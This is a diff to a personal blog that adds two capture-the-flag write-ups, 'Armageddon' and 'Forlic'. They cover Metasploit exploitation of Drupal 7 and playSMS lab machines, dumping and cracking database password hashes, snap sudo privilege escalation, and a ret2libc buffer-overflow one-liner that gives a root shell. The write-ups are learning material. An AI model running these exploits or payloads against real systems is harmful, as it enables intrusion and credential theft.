@@ -71,6 +71,148 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Armageddon" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/16/Armageddon/" class="article-date">
+  <time class="dt-published" datetime="2022-07-16T14:58:49.000Z" itemprop="datePublished">2022-07-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/16/Armageddon/">Armageddon</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/16/Armageddon/nmap.png">
+
+<h4 id="2-web"><a href="#2-web" class="headerlink" title="2.web"></a>2.web</h4><p>from the burpsuite,we can get the response and know it build with drupal 7<br><img src="/2022/07/16/Armageddon/burp.png"><br>when we use searchsploit,we can see some exploit<br><img src="/2022/07/16/Armageddon/searchsploit.png"><br>we can use msfconsole to exploit it</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search drupal 7</span><br><span class="line">use 1</span><br><span class="line">set rhosts 10.10.10.233</span><br><span class="line">set lhost 10.10.14.15</span><br></pre></td></tr></table></figure>
+<p>and we can get the shell<br><img src="/2022/07/16/Armageddon/msf.png"><br>it denied us to cd &#x2F;home<br>so we cd to sites&#x2F;default and in the settings.php,we can get the database’s username and password<br><img src="/2022/07/16/Armageddon/database.png"><br>username:<code>drupaluser</code><br>password:<code>CQHEy@9M*m23gBVj</code></p>
+<p>we can try this to login mysql<br>but in the &#x2F;etc&#x2F;passwd,we didn’t see drupaluser,therefore we probably need to get password hashes from the database itself:<br><img src="/2022/07/16/Armageddon/passwd.png"><br>Using the credentials drupaluser:<code>CQHEy@9M*m23gBVj</code>, we can get the databases users and hashes.   </p>
+<pre><code>mysql -u drupaluser -p&quot;CQHEy@9M*m23gBVj&quot; -e &quot;use drupal; select name,pass from users;&quot;
+</code></pre>
+<img src="/2022/07/16/Armageddon/hash.png">
+Using the RockYou wordlist we can crack the password hash for the brucetherealadmin user.
+
+<pre><code>john -w=/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre>
+<img src="/2022/07/16/Armageddon/hashcrack.png">
+
+<p>username:brucetherealadmin<br>password:booboo<br>And we have brucetherealadmin’s password! Now let’s try to login via SSH:<br><img src="/2022/07/16/Armageddon/ssh.png"></p>
+<h4 id="3-getting-root-access"><a href="#3-getting-root-access" class="headerlink" title="3.getting root access"></a>3.getting root access</h4><p>when we use <code>sudo -l</code>,Looks like we are able to run snap as the root user without any password, therefore let’s use the <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/snap/">gtfobin</a> for snap:<br><img src="/2022/07/16/Armageddon/sudo.png"><br>first we get fpm and do something next</p>
+<pre><code>gem install fpm
+</code></pre>
+<img src="/2022/07/16/Armageddon/prepare.png">
+Now we upload the malicious privesc snap file to the machine and run it:
+<img src="/2022/07/16/Armageddon/upload.png">
+<img src="/2022/07/16/Armageddon/download.png">
+Now let's run snap as the root user to make use of the snap package we created:
+<img src="/2022/07/16/Armageddon/root.png">
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/16/Armageddon/" data-id="cl5o3n1bl0000sycpb97b36fa" data-title="Armageddon" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Forlic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/15/Forlic/" class="article-date">
+  <time class="dt-published" datetime="2022-07-15T09:34:32.000Z" itemprop="datePublished">2022-07-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/15/Forlic/">Forlic</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/15/Forlic/nmap.png">
+
+<h5 id="port-exploration"><a href="#port-exploration" class="headerlink" title="port exploration"></a>port exploration</h5><p>9999: at 10.10.10.111:9999,it’s a simple nginx welcome page<br>445: smb is running on the 445,we can use common ways to find if there is something can be used </p>
+<pre><code> smbmap -H 10.10.10.111 
+</code></pre>
+<p>smbmap shows nothing we can use<br><img src="/2022/07/15/Forlic/smbmap.png" width="60%"></p>
+<pre><code> smbclient -N -L //10.10.10.111
+</code></pre>
+<p>and smbclient also shows nothing interesting<br><img src="/2022/07/15/Forlic/smbclient.png" width="60%"><br>1880: the 9999 port’s site gives us a url:<a target="_blank" rel="noopener" href="http://forlic.htb:1880/">http://forlic.htb:1880</a><br>it’s an admin web</p>
+<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>we try dirsearch to all ports we find,and in 9999 there has some pages<br><img src="/2022/07/15/Forlic/dirsearch.png" width="60%"><br>10.10.10.111:9999&#x2F;test has a phpinfo page<br>10.10.10.111:9999&#x2F;backup has something useful<br>10.10.10.111:9999&#x2F;dev is forbidden<br>10.10.10.111:9999&#x2F;admin is an admin page<br><img src="/2022/07/15/Forlic/backup.png" width="60%"><br>we can use <code>curl 10.10.10.111:9999/backup/user.txt</code> and <code>curl 10.10.10.111:9999/backup/password.txt</code> to get admin and imnothuman</p>
+<h5 id="dirsearch-deeper"><a href="#dirsearch-deeper" class="headerlink" title="dirsearch deeper"></a>dirsearch deeper</h5><p>though the &#x2F;dev is forbidden,we use dirsearch http:10.10.10.111:9999&#x2F;dev to explore deeper<br>it has backup and test<br><img src="/2022/07/15/Forlic/dev.png" width="60%"><br>in the &#x2F;backup,it shows &#x2F;playsms<br>in the &#x2F;test,it provides a file name test<br>10.10.10.111:9999&#x2F;playsms is another login page</p>
+<h5 id="x2F-admin"><a href="#x2F-admin" class="headerlink" title="&#x2F;admin"></a>&#x2F;admin</h5><p>the &#x2F;admin loads a js hide the login information<br><img src="/2022/07/15/Forlic/admin.png" width="60%"><br>the username is admin and the password is superduperlooperpassword_lol<br>after entering it,we can see a brainfuck code,and to decode it<br><img src="/2022/07/15/Forlic/brainfuck.png" width="60%"><br><code>https://www.dcode.fr/ook-language</code><br><img src="/2022/07/15/Forlic/brainfuckdecode.png" width="60%"><br>it shows <code>Nothing here check /asdiSIAJJ0QWE9JAS</code><br>after visit it,it displays a new page encoded,after decoded,we get some message<br><img src="/2022/07/15/Forlic/b64.png" width="60%"><br>decode it,and it seems like a zip <code>curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | xxd</code><br><img src="/2022/07/15/Forlic/zip.png" width="60%"><br><code>curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d &gt; index.php.zip</code><br>unzip it,it has a password<br>use fcrackzip to unpack it<br><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt out.zip</code><br>The options are -u to force actual unzip, which weeds out tons of fps, -D for dictionary, and -p rockyou.txt to pass the wordlist.and the password&#x3D;password<br><img src="/2022/07/15/Forlic/index.png" width="60%"><br>Use xxd to read that back to bytes, which happens to be not only ASCII, but base64 characters <code>cat index.php | xxd -r -p</code><br><img src="/2022/07/15/Forlic/base64.png" width="60%"><br>decode it,and get the text<br><code>cat index.php | xxd -r -p | tr -d &#39;\r\n&#39; | base64 -d</code><br><img src="/2022/07/15/Forlic/brainfuck2.png" width="60%"><br>it’s brainfuck,decode at <code>https://copy.sh/brainfuck/</code> and get the phrase idkwhatispass</p>
+<h4 id="2-shell-as-web"><a href="#2-shell-as-web" class="headerlink" title="2.shell as web"></a>2.shell as web</h4><h5 id="now-we-have-two-password"><a href="#now-we-have-two-password" class="headerlink" title="now we have two password"></a>now we have two password</h5><p>1.admin&#x2F;superduperlooperpassword_lol 2.admin&#x2F;idkwhatispass<br>try it at &#x2F;admin &#x2F;playsms and final password2 worked on &#x2F;playsms</p>
+<h5 id="use-msfconsole"><a href="#use-msfconsole" class="headerlink" title="use msfconsole"></a>use msfconsole</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search playsms</span><br><span class="line">use 1</span><br><span class="line">set rhost 10.10.10.111</span><br><span class="line">set rport 9999</span><br><span class="line">set targeturi /playsms/index.php</span><br><span class="line">set lhost 10.10.14.15</span><br></pre></td></tr></table></figure>
+<p>then we get a webshell<br><img src="/2022/07/15/Forlic/webshell.png" width="60%"></p>
+<h4 id="3-shell-as-root"><a href="#3-shell-as-root" class="headerlink" title="3.shell as root"></a>3.shell as root</h4><p>first improve the shell</p>
+<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<img src="/2022/07/15/Forlic/ayush.png" width="60%">
+we can see some hide catelog in ayush's home
+the .binary has the suid,the rop in it is owned by root
+<img src="/2022/07/15/Forlic/root.png" width="60%">
+the rop's function is to get our input and output it
+<img src="/2022/07/15/Forlic/ropfunction.png" width="60%">
+we can first see what's configured
+
+<pre><code>cat /proc/sys/kernel/randomize_va_space
+</code></pre>
+<p>it shows no ASLR<br>because we stright open it can’t read it,so we use base64 to read<br>and save it to local machine and use <code>base64 -d rop_b64 &gt; rop</code> to restore it<br><img src="/2022/07/15/Forlic/rop.png" width="60%"><br>open it in gdb with <a target="_blank" rel="noopener" href="https://github.com/longld/peda">PEDA</a>, and run checksec<br><img src="/2022/07/15/Forlic/checksec.png" width="60%"><br>we can force the program to crash<br><img src="/2022/07/15/Forlic/crash.png" width="60%"></p>
+<h5 id="background"><a href="#background" class="headerlink" title="background"></a>background</h5><p>I can cause the program to crash by sending too much input which likely means I can overwrite the return address somewhere. Given that ASLR is disabled but DEP (NX) is enabled, the easiest attack path is to use Return to libc.</p>
+<h5 id="understand-return-to-libc"><a href="#understand-return-to-libc" class="headerlink" title="understand return to libc"></a>understand return to libc</h5><h6 id="1-stack"><a href="#1-stack" class="headerlink" title="1.stack"></a>1.stack</h6><p>The stack starts at high memory addresses, and builds up to lower memory addresses. Inside any given function, there’s a stack frame. The bottom of the stack frame is stored in the RBP (or EBP on x86) register. The top is stored in RSP (or ESP). For example (and I’ll use 32-bit registers in this example since Frolic is 32-bit):<br><img src="/2022/07/15/Forlic/1.jpg" width="60%"></p>
+<h6 id="2-function-call"><a href="#2-function-call" class="headerlink" title="2.function call"></a>2.function call</h6><p>When a function is called, the arguments are put onto the stack (either by adding space to the top or using the space already there). So, for example, the program comes to:<br><img src="/2022/07/15/Forlic/2.jpg" width="60%"><br>Just before the call, two addresses are stored in ESP and ESP+4. These are the addresses of the string to copy and the buffer to copy it to:<br><img src="/2022/07/15/Forlic/3.jpg" width="60%"><br>Now the call instruction is reached. It is going to push the next instruction to the top of the stack (as the return address), and then jump execution to the new function. The next function is going to start with some common stuff, known as the prologue:<br><img src="/2022/07/15/Forlic/4.jpg" width="60%"><br>So take that step by step. call pushes return address:<br><img src="/2022/07/15/Forlic/5.jpg" width="60%"><br>Now push ebp:<br><img src="/2022/07/15/Forlic/6.jpg" width="60%"><br>mov ebp, esp:<br><img src="/2022/07/15/Forlic/7.jpg" width="60%"><br>Finally sub esp, 0x100:<br><img src="/2022/07/15/Forlic/8.jpg" width="60%"></p>
+<h6 id="3-stack-return"><a href="#3-stack-return" class="headerlink" title="3. stack return"></a>3. stack return</h6><p>When a function is done, it will typically end with:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p><code>leave == mov esp, ebp + pop ebp</code><br>So the stack from before becomes:<br><img src="/2022/07/15/Forlic/9.jpg" width="60%"><br>Then when the return happens, the instruction pointer is popped, bringing that stack back to where it started:<br><img src="/2022/07/15/Forlic/10.jpg" width="60%"></p>
+<h6 id="4-What-Is-Return-to-libc"><a href="#4-What-Is-Return-to-libc" class="headerlink" title="4.What Is Return to libc"></a>4.What Is Return to libc</h6><p>A return to libc attack involves overwriting the return address in such a way that the computer jumps to the function I want. The standard case is the system function, with the argument &#x2F;bin&#x2F;sh, giving me a shell.</p>
+<p>If I were to call system(“&#x2F;bin&#x2F;sh”) normally, I would enter the function after the call but before the prologue with a stack like this:<br><img src="/2022/07/15/Forlic/11.jpg" width="60%"><br>The return address would be pushed onto the stack by the call instruction. But I’m not going to be going to system via a call, but rather a ret. So, I want the stack to look like this when I reach the return:<br><img src="/2022/07/15/Forlic/12.jpg" width="60%"><br>That way, ret will pop the system address into the instruction pointer, and the stack will look right. Since I don’t know the right return address, I’ll just use the function exit, so it cleanly exits when I’m done.</p>
+<h5 id="Find-the-Offset-to-EIP"><a href="#Find-the-Offset-to-EIP" class="headerlink" title="Find the Offset to EIP"></a>Find the Offset to EIP</h5><p>open the file with gbb-peda,and When the program crashes, I can take EIP and find out where that was in the pattern using pattern offset<br><img src="/2022/07/15/Forlic/eip.png" width="60%"><br>When the program crashes, I can take EIP and find out where that was in the pattern using pattern offset. I can use the ASCII or hex value:<br><img src="/2022/07/15/Forlic/AAGA.png" width="60%"><br>To double check that, I’ll send in a buffer of 52 As and then 4 Bs:<br><img src="/2022/07/15/Forlic/eip2.png" width="60%"><br>Crash, with EIP as BBBB.</p>
+<h5 id="Addresses"><a href="#Addresses" class="headerlink" title="Addresses"></a>Addresses</h5><p>Now I just need the addresses of <code>system</code>, <code>exit</code>, and <code>/bin/sh</code> in libc. This will vary on different hosts, so I’ll get the info with my shell on Frolic. First, I’ll get the base libc address with ldd,<br>Next, I’ll use <code>readelf -s</code> to get the offsets to various functions, and grep out <code>system</code> and <code>exit</code>,<br>Now I’ll use <code>strings -a -t x</code> to get the strings from libc with hex offsets, and grep for “&#x2F;bin&#x2F;sh”:<br><img src="/2022/07/15/Forlic/addresses.png" width="60%"><br>Now I can calculate the address for each of the three using any calculator (gdb here):<br><img src="/2022/07/15/Forlic/p.png" width="60%"></p>
+<h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><p>I can put that all together into this template: <code>&quot;A&quot; * 52 + SYSTEM + EXIT + /bin/sh</code>. I could write a python script to do this, but this case is simple enough that I can just do it as a one-liner. When I run that on Frolic, I’m root:<br><code>./rop $(python -c &#39;print(&quot;a&quot;*52 + &quot;\xa0\x3d\xe5\xb7&quot; + &quot;\xd0\x79\xe4\xb7&quot; + &quot;\x0b\x4a\xf7\xb7&quot;)&#39;)</code><br>now we finally get the flag<br><img src="/2022/07/15/Forlic/flag.png" width="60%"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/15/Forlic/" data-id="cl5o3n1bq0001sycpddrk9fhi" data-title="Forlic" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Scriptkiddle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/07/14/Scriptkiddle/" class="article-date">
@@ -104,7 +246,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl5m6445w0001ricp9z71hakc" data-title="Scriptkiddle" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl5o3n1bs0002sycp9kxc6piv" data-title="Scriptkiddle" class="article-share-link">Share</a>
       
       
       
@@ -154,7 +296,7 @@ so we can try run monitor.sh and the color of text changed
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl5m6445r0000ricpbtc5befh" data-title="Nibbles" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/14/Nibbles/" data-id="cl5o3n1bt0003sycp031kcp9j" data-title="Nibbles" class="article-share-link">Share</a>
       
       
       
@@ -258,7 +400,7 @@ line 3 of code
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl5m6445y0002ricpfy7lhbve" data-title="first_blog" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/13/first-blog/" data-id="cl5o3n1bu0004sycp5snmcedj" data-title="first_blog" class="article-share-link">Share</a>
       
       
       
@@ -299,6 +441,14 @@ line 3 of code
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2022/07/16/Armageddon/">Armageddon</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/15/Forlic/">Forlic</a>
+          </li>
         
           <li>
             <a href="/2022/07/14/Scriptkiddle/">Scriptkiddle</a>
